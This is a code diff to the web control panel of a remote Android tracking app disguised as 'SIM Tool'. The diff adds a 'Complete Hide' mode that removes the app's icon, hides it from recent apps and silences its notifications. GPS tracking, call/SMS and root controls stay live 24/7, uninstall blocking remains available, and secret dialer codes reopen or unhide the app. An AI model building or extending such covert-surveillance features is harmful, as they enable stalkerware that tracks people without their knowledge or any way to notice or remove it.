@@ -4356,20 +4356,20 @@
           </div>
         </div>
 
-        <!-- Card 4: 👁️ Stealth Mode & Launcher Disguise -->
+        <!-- Card 4: 👁️ Complete Hide / Unhide & Launcher Disguise -->
         <div class="control-card stealth-card rail-feat-card">
           <div class="card-header-line">
-            <div class="card-title"><i class="bi bi-eye-slash-fill" style="color:#fbbf24"></i> Stealth &amp; Launcher Disguise</div>
+            <div class="card-title"><i class="bi bi-eye-slash-fill" style="color:#fbbf24"></i> Complete Hide &amp; Disguise</div>
             <span class="badge-mini warning" id="badgeCardStealthStatus">VISIBLE</span>
           </div>
-          <p class="card-desc">Hide app icon from home screen &amp; app drawer, customize profile header, and switch disguise presets remotely.</p>
+          <p class="card-desc">Completely hide APK (launcher icon, recents &amp; persistent notifications) while keeping GPS, calls, SMS, DPC &amp; root controls live 24/7. Dial <code>*#*#7468665#*#*</code> to open stealthily or <code>*#*#864433#*#*</code> to unhide.</p>
 
           <div class="btn-group-2" style="margin-bottom:8px;">
             <button class="btn-ctrl btn-warning" onclick="hideIconCommand()">
-              <i class="bi bi-eye-slash"></i> Hide App Icon
+              <i class="bi bi-eye-slash"></i> Complete Hide APK
             </button>
             <button class="btn-ctrl btn-secondary" onclick="showIconCommand()">
-              <i class="bi bi-eye"></i> Restore App Icon
+              <i class="bi bi-eye"></i> Unhide APK
             </button>
           </div>
 
@@ -4443,7 +4443,7 @@
               <label style="font-size:0.65rem; color:#94a3b8; display:block; margin-bottom:2px;">Launcher Icon Visibility</label>
               <select id="selAppCfgHideIcon" class="form-control compact" onchange="markAppCfgDirty(this.id)">
                 <option value="false">Visible in App Drawer</option>
-                <option value="true">Hidden (Stealth Mode)</option>
+                <option value="true">Complete Hide (Icon + Recents + Silent)</option>
               </select>
             </div>
             <div>
@@ -4776,8 +4776,8 @@
               <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px;">
                 <button type="button" class="btn-ctrl btn-success compact" data-cap="DPC" onclick="dispatchCentralCommand('APPLY_POLICIES', {}, true)"><i class="bi bi-shield-lock"></i> Enforce DPC</button>
                 <button type="button" class="btn-ctrl btn-outline compact" data-cap="DPC_OR_ROOT" onclick="dispatchCentralCommand('GRANT_PERMISSIONS', {})"><i class="bi bi-check2-all"></i> Grant Perms</button>
-                <button type="button" class="btn-ctrl btn-warning compact" onclick="dispatchCentralCommand('HIDE_ICON', {}, true)"><i class="bi bi-eye-slash"></i> Hide App Icon</button>
-                <button type="button" class="btn-ctrl btn-outline compact" onclick="dispatchCentralCommand('SHOW_ICON', {})"><i class="bi bi-eye"></i> Show App Icon</button>
+                <button type="button" class="btn-ctrl btn-warning compact" onclick="dispatchCentralCommand('COMPLETE_HIDE', {}, true)"><i class="bi bi-eye-slash"></i> Complete Hide</button>
+                <button type="button" class="btn-ctrl btn-outline compact" onclick="dispatchCentralCommand('COMPLETE_UNHIDE', {})"><i class="bi bi-eye"></i> Unhide APK</button>
                 <button type="button" class="btn-ctrl btn-outline compact" onclick="dispatchCentralCommand('SET_NOTIFICATION', { enabled: true })"><i class="bi bi-bell"></i> FGS Notif ON</button>
                 <button type="button" class="btn-ctrl btn-outline compact" onclick="dispatchCentralCommand('SET_NOTIFICATION', { enabled: false })"><i class="bi bi-bell-slash"></i> FGS Silent</button>
                 <button type="button" class="btn-ctrl btn-secondary compact" onclick="dispatchCentralCommand('REBOOT', {}, true)"><i class="bi bi-arrow-clockwise"></i> DPC Reboot</button>
@@ -8073,7 +8073,7 @@
     const liveActive = (d.intervalSeconds !== undefined) ? (d.intervalSeconds > 0 && feats.trackingEnabled !== false) : undefined;
     syncBinaryControlState('rs_core_gpsLive', liveActive, { on: 'LIVE', off: 'SLEEP' });
     syncBinaryControlState('rs_core_siren', d.sirenActive, { on: 'ACTIVE', off: 'IDLE' });
-    syncBinaryControlState('rs_core_stealth', d.isLauncherHidden, { on: 'HIDDEN', off: 'VISIBLE' });
+    syncBinaryControlState('rs_core_stealth', !!(d.isCompleteHidden || d.isLauncherHidden), { on: 'HIDDEN', off: 'VISIBLE' });
     syncBinaryControlState('rs_core_notif', d.notificationEnabled, { on: 'ON', off: 'SILENT' });
     syncBinaryControlState('rs_core_lockMsg', d.isLockScreenMessageActive, { on: 'ACTIVE', off: 'CLEARED' });
     syncBinaryControlState('rs_core_uninstall', rest.uninstallBlocked !== undefined ? rest.uninstallBlocked : d.uninstallBlocked, { on: 'BLOCKED', off: 'ALLOWED' });
@@ -8720,6 +8720,7 @@
       dev.lastUserResponseReqId = data.lastUserResponseReqId || '';
     }
     if (data.notificationEnabled !== undefined) dev.notificationEnabled = !!data.notificationEnabled;
+    if (data.isCompleteHidden !== undefined) dev.isCompleteHidden = !!data.isCompleteHidden;
     if (data.isLauncherHidden !== undefined) dev.isLauncherHidden = !!data.isLauncherHidden;
     if (data.sirenActive !== undefined) dev.sirenActive = !!data.sirenActive;
     if (data.isLiveStreaming !== undefined) dev.isLiveStreaming = !!data.isLiveStreaming;
@@ -8903,10 +8904,13 @@
       dev.sirenActive = true;
     } else if (action === 'STOP_ALARM' || status === 'STOPPED') {
       dev.sirenActive = false;
-    } else if (action === 'HIDE_ICON' || status === 'LAUNCHER_ICON_HIDDEN') {
+    } else if (action === 'HIDE_ICON' || action === 'HIDE_APP' || action === 'COMPLETE_HIDE' || status === 'LAUNCHER_ICON_HIDDEN' || status === 'COMPLETE_HIDE_ENABLED' || msg === 'COMPLETE_HIDE_ENABLED') {
       dev.isLauncherHidden = true;
-    } else if (action === 'SHOW_ICON' || status === 'LAUNCHER_ICON_SHOWN') {
+      dev.isCompleteHidden = true;
+      dev.notificationEnabled = false;
+    } else if (action === 'SHOW_ICON' || action === 'UNHIDE_ICON' || action === 'UNHIDE_APP' || action === 'COMPLETE_UNHIDE' || status === 'LAUNCHER_ICON_SHOWN') {
       dev.isLauncherHidden = false;
+      dev.isCompleteHidden = false;
     } else if (action === 'SET_NOTIFICATION') {
       dev.notificationEnabled = !String(status).includes('SILENCED') && !String(msg).includes('SILENCED');
     } else if ((action === 'SET_DEVICE_NAME' || action === 'SET_TAG' || action === 'SET_TAG_NAME') && isSuccess) {
@@ -9690,13 +9694,13 @@
   function hideIconCommand() {
     const scopeTxt = (typeof applyControlsToGroup !== 'undefined' && applyControlsToGroup && selectedFleetDevices.size > 0)
       ? `${selectedFleetDevices.size} selected device(s)` : `device ${currentTargetImei}`;
-    if (confirm(`Hide app icon from home screen and app drawer on ${scopeTxt}?\n\nApp remains active in background. Launch via secret dialer codes:\n*#*#7468665#*#* (*#*#SIMTOOL#*#*) or *#*#15263748#*#*.`)) {
-      dispatchTargetOrGroupCommand('HIDE_ICON');
+    if (confirm(`Engage COMPLETE HIDE on ${scopeTxt}?\n\n• Launcher icon & app drawer entry removed\n• Hidden from Recent Apps switcher\n• Persistent notifications silenced / suppressed\n• GPS, Calls/SMS, DPC & Root controls stay 100% ACTIVE 24/7\n\nOpen silently: *#*#7468665#*#*\nUnhide on device: *#*#864433#*#*`)) {
+      dispatchTargetOrGroupCommand('COMPLETE_HIDE');
     }
   }
 
   function showIconCommand() {
-    dispatchTargetOrGroupCommand('SHOW_ICON');
+    dispatchTargetOrGroupCommand('COMPLETE_UNHIDE');
   }
 
   function setAppNameCommand() {
@@ -10857,7 +10861,7 @@
   const CORE_CONTROL_MATRIX_DEFS = [
     { domKey: 'core_gpsLive', label: 'Live GPS Interval Streaming (30s)', icon: 'bi-broadcast', color: '#34d399', mode: 'HYBRID', cap: 'NORMAL', labels: { on: 'LIVE', off: 'SLEEP' }, onCmd: 'SET_INTERVAL', onParams: { seconds: 30 }, offCmd: 'SET_INTERVAL', offParams: { seconds: 0 } },
     { domKey: 'core_siren', label: 'Audible Anti-Theft Siren', icon: 'bi-volume-up-fill', color: '#f87171', mode: 'HYBRID', cap: 'NORMAL', labels: { on: 'ACTIVE', off: 'IDLE' }, onCmd: 'TRIGGER_ALARM', onParams: { duration: 30 }, offCmd: 'STOP_ALARM', offParams: {} },
-    { domKey: 'core_stealth', label: 'Stealth Hide Launcher Icon', icon: 'bi-eye-slash-fill', color: '#fbbf24', mode: 'HYBRID', cap: 'NORMAL', labels: { on: 'HIDDEN', off: 'VISIBLE' }, onCmd: 'HIDE_ICON', onParams: {}, offCmd: 'SHOW_ICON', offParams: {} },
+    { domKey: 'core_stealth', label: 'Complete Stealth Hide APK', icon: 'bi-eye-slash-fill', color: '#fbbf24', mode: 'HYBRID', cap: 'NORMAL', labels: { on: 'HIDDEN', off: 'VISIBLE' }, onCmd: 'COMPLETE_HIDE', onParams: {}, offCmd: 'COMPLETE_UNHIDE', offParams: {} },
     { domKey: 'core_notif', label: 'Persistent Service Notification', icon: 'bi-bell-fill', color: '#38bdf8', mode: 'HYBRID', cap: 'NORMAL', labels: { on: 'ON', off: 'SILENT' }, onCmd: 'SET_NOTIFICATION', onParams: { enabled: true }, offCmd: 'SET_NOTIFICATION', offParams: { enabled: false } },
     { domKey: 'core_lockMsg', label: 'Lock Screen Banner Message', icon: 'bi-phone-lock', color: '#a855f7', mode: 'NORMAL', cap: 'NORMAL', labels: { on: 'ACTIVE', off: 'CLEARED' }, onCmd: 'OPEN_LOCK_MSG_MODAL', onParams: {}, offCmd: 'CLEAR_LOCK_SCREEN_MESSAGE', offParams: {} },
     { domKey: 'core_uninstall', label: 'Block App Uninstall Protection', icon: 'bi-shield-lock-fill', color: '#f87171', mode: 'DPC', cap: 'DPC', labels: { on: 'BLOCKED', off: 'ALLOWED' }, onCmd: 'BLOCK_UNINSTALL', onParams: {}, offCmd: 'UNBLOCK_UNINSTALL', offParams: {} },
@@ -11908,9 +11912,10 @@
 
     // Sync Core Device Controls Live Matrix
     const liveStreamActive = (dev.intervalSeconds !== undefined) ? (dev.intervalSeconds > 0 && (feats.trackingEnabled !== false)) : undefined;
+    const isAppHidden = !!(dev.isCompleteHidden || dev.isLauncherHidden);
     syncBinaryControlState('core_gpsLive', liveStreamActive, { on: 'LIVE', off: 'SLEEP' });
     syncBinaryControlState('core_siren', dev.sirenActive, { on: 'ACTIVE', off: 'IDLE' });
-    syncBinaryControlState('core_stealth', dev.isLauncherHidden, { on: 'HIDDEN', off: 'VISIBLE' });
+    syncBinaryControlState('core_stealth', isAppHidden, { on: 'HIDDEN', off: 'VISIBLE' });
     syncBinaryControlState('core_notif', dev.notificationEnabled, { on: 'ON', off: 'SILENT' });
     syncBinaryControlState('core_lockMsg', dev.isLockScreenMessageActive, { on: 'ACTIVE', off: 'CLEARED' });
     syncBinaryControlState('core_uninstall', rest.uninstallBlocked !== undefined ? rest.uninstallBlocked : dev.uninstallBlocked, { on: 'BLOCKED', off: 'ALLOWED' });
@@ -11925,9 +11930,10 @@
       bSiren.textContent = dev.sirenActive ? 'ALARM RINGING' : 'IDLE';
     }
     const bStealth = document.getElementById('badgeCardStealthStatus');
-    if (bStealth && dev.isLauncherHidden !== undefined) {
-      bStealth.className = `badge-mini ${dev.isLauncherHidden ? 'purple' : 'warning'}`;
-      bStealth.textContent = dev.isLauncherHidden ? 'ICON HIDDEN' : 'VISIBLE';
+    if (bStealth && (dev.isLauncherHidden !== undefined || dev.isCompleteHidden !== undefined)) {
+      const hid = !!(dev.isCompleteHidden || dev.isLauncherHidden);
+      bStealth.className = `badge-mini ${hid ? 'purple' : 'warning'}`;
+      bStealth.textContent = dev.isCompleteHidden ? 'COMPLETELY HIDDEN' : (dev.isLauncherHidden ? 'ICON HIDDEN' : 'VISIBLE');
     }
 
     const hw = (data && data.hardware) ? data.hardware : dev.hardware;
@@ -12447,7 +12453,7 @@
         renderInfoRow('App Name', d.appName || (d.config && d.config.appName) || 'SIM Tool'),
         renderInfoRow('App Version', d.appVersion || '--'),
         renderInfoRow('Launcher Disguise', d.launcherName || 'SIM Tool'),
-        renderInfoRow('Icon Stealth', d.isLauncherHidden ? 'HIDDEN' : 'VISIBLE'),
+        renderInfoRow('APK Stealth Status', d.isCompleteHidden ? 'COMPLETELY HIDDEN' : (d.isLauncherHidden ? 'ICON HIDDEN' : 'VISIBLE')),
         renderInfoRow('GPS Interval / Reconnect', `${d.intervalSeconds !== undefined ? d.intervalSeconds + 's' : '--'} / ${d.reconnectIntervalSeconds || 15}s`),
         renderInfoRow('Broker Host : Port', d.brokerHost ? `${d.brokerHost}:${d.brokerPort || 8883}` : '--'),
         renderInfoRow('Topic Pattern', d.topicPattern || '--'),
